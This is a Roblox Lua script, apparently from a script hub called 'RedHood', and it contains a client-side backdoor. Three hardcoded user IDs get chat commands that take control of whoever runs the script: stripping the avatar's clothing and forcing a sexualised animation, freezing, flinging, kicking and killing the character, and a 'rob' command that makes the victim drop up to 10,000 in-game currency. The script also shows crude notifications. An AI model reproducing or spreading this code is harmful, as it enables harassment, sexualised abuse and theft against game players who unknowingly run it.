local dexmins = {
	3065919675,
	548060160,
	2970881542,
	
}

local kickmsg = 'Got kick by RedHood Premium user'

local function checkmom(player)
	for i,v in pairs(dexmins) do
		if (player.UserId == v) then
			player.Chatted:Connect(function(cht)
				if cht:match("?benx .") then
					wait(0) local A_1 = "Yeah Yeah!" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = player.Character.HumanoidRootPart
					local benxed = true
					game.StarterGui:SetCore("SendNotification", {Title = "REDHOOD", Text = "Got Fuck By Premium user", Icon = "rbxassetid://9107555643", Duration = 5,})
					while benxed == true do
						local hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
						pcall(function()
							hummy.Parent.Pants:Destroy()
						end)
						pcall(function()
							hummy.Parent.Shirt:Destroy()
						end)
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + player.Character.HumanoidRootPart.CFrame.lookVector * 0.5
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
						wait(0.1)
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
					end
				end
			end)

			player.Chatted:connect(function(cht)
				if cht:match("?unbenx .") then
					local benxPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
					wait(0.7)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = benxPos
				end
			end)
			player.Chatted:connect(function(cht)
				if cht:match("?bring .") then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
					game.StarterGui:SetCore("SendNotification", {Title = "REDHOOD", Text = "Got bring By Premium user", Icon = "rbxassetid://9107555643", Duration = 5,})
				end
			end)
			player.Chatted:connect(function(cht)
				if cht:match("?freeze .") then
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
					game.StarterGui:SetCore("SendNotification", {Title = "REDHOOD", Text = "Freeze by Premium user", Icon = "rbxassetid://9107555643", Duration = 5,})
				end
			end)
			player.Chatted:connect(function(cht)
				if cht:match("?unfreeze .") then
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
					game.StarterGui:SetCore("SendNotification", {Title = "REDHOOD", Text = "Unfreeze by Premium user", Icon = "rbxassetid://9107555643", Duration = 5,})
				end
			end)
			player.Chatted:connect(function(cht)
				if cht:match("?kick .") then
					game.Players.LocalPlayer:Kick(kickmsg)
				end
			end)
			player.Chatted:connect(function(cht)
				if cht:match("?fling .") then
					game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -20000000
					game.StarterGui:SetCore("SendNotification", {Title = "REDHOOD", Text = "Got Fling By Premium user", Icon = "rbxassetid://9107555643", Duration = 5,})
				end
			end)
			player.Chatted:connect(function(cht)
				if cht:match("?rob .") then
					local oldPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
					wait(0.2)
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
					local MainEvent = game:GetService('ReplicatedStorage').MainEvent
					if game.Players.LocalPlayer.DataFolder.Currency.Value >= 10000 then
						MainEvent:FireServer('DropMoney', '10000')
					elseif game.Players.LocalPlayer.DataFolder.Currency.Value <= 10000 then
						MainEvent:FireServer('DropMoney', (game.Players.LocalPlayer.DataFolder.Currency.Value))
					end
					game.StarterGui:SetCore("SendNotification", {Title = "REDHOOD", Text = "Got Rob By Premium user", Icon = "rbxassetid://9107555643", Duration = 5,})
					wait(1)
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldPos
				end
			end)
		end
	end
end

game.Players.PlayerAdded:Connect(checkmom)
for _,player in pairs(game.Players:GetChildren()) do
	checkmom(player)
end
